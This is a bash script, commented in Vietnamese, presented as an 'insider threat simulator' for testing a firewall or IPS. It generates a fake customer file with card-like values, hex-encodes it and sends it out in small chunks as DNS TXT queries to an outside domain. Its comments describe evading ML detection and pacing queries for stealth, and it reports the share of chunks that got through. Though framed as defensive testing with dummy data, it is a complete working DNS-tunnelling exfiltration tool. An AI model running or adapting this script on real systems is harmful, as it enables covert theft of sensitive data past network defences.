#!/bin/bash
# =========================================================
# INSIDER THREAT SIMULATOR: EXFILTRATION WITH SUCCESS METRICS
# =========================================================

GATEWAY_IP="192.168.50.1"
MALWARE_ROOT="api-telemetry.com"
FILE_TO_STEAL="Secret.csv"
CHUNK_SIZE=10  # Cắt thành các khúc siêu ngắn để lách ML

echo "[*] Đang chuẩn bị kịch bản tuồn dữ liệu..."

# 1. Tạo file mồi chứa 100 khách hàng VIP (Dung lượng ~ 5.5 KB)
if [ ! -f "$FILE_TO_STEAL" ]; then
    echo "ID,Name,Email,Credit_Card,Secret_Code" > $FILE_TO_STEAL
    # Tạo 100 dòng dữ liệu giả bằng vòng lặp
    for j in {1..100}; do
        echo "$j,VIP_Client_$j,client$j@aws.com,4111-2222-3333,PROJECT_X_2026_CODE_$j" >> $FILE_TO_STEAL
    done
    echo "[+] Đã tạo file dữ liệu giả: $FILE_TO_STEAL ($(wc -c < $FILE_TO_STEAL) Bytes)"
fi

HEX_DATA=$(xxd -p $FILE_TO_STEAL | tr -d '\n')
TOTAL_CHUNKS=$((${#HEX_DATA} / $CHUNK_SIZE + 1))

echo "[*] Dữ liệu đã mã hóa HEX. Tổng số gói tin cần gửi: $TOTAL_CHUNKS"
echo "---------------------------------------------------"

# Bộ đếm Metrics
SUCCESS_COUNT=0
BLOCKED_COUNT=0

# Quá trình bắn
for ((i=0; i<${#HEX_DATA}; i+=CHUNK_SIZE)); do
    CHUNK="${HEX_DATA:$i:$CHUNK_SIZE}"
    DOMAIN="${CHUNK}.${MALWARE_ROOT}"
    
    # 1. Bắn gói DNS
    dig +short +time=1 +tries=1 TXT "$DOMAIN" @$GATEWAY_IP > /dev/null
    
    # CHỜ MỘT CHÚT CHO PYTHON VÀ IPTABLES KỊP PHẢN ỨNG (Giảm Race Condition)
    sleep 0.2 
    
    # 2. Kiểm tra trạng thái tường lửa bằng Ping
    if ping -c 1 -W 1 $GATEWAY_IP > /dev/null 2>&1; then
        echo " -> [THÀNH CÔNG] Gói $((i/CHUNK_SIZE + 1)): $CHUNK (Payload) đã lọt qua."
        ((SUCCESS_COUNT++))
    else
        echo " -> [BỊ CHẶN!] Gói $((i/CHUNK_SIZE + 1)): $CHUNK (Payload) - Tường lửa đã khóa mạng!"
        ((BLOCKED_COUNT++))
    fi
    
    # Nghỉ thêm 1 chút giữa các gói để tàng hình
    sleep 3 
done

echo "---------------------------------------------------"
echo "[*] BÁO CÁO KẾT QUẢ KIỂM THỬ (METRICS):"
echo " - Tổng số gói: $TOTAL_CHUNKS"
echo " - Số gói lọt qua: $SUCCESS_COUNT"
echo " - Số gói bị chặn: $BLOCKED_COUNT"

# Tính phần trăm
PERCENT_SUCCESS=$(echo "scale=2; ($SUCCESS_COUNT / $TOTAL_CHUNKS) * 100" | bc)
echo " => Tỷ lệ tuồn dữ liệu thành công: $PERCENT_SUCCESS%"

if (( $(echo "$PERCENT_SUCCESS == 100.00" | bc -l) )); then
    echo -e "\n[!!!] NGUY HIỂM: Toàn bộ dữ liệu đã bị tuồn ra ngoài mà không bị phát hiện!"
else
    echo -e "\n[+] AN TOÀN: Hệ thống IPS đã can thiệp và ngăn chặn quá trình rò rỉ!"
fi
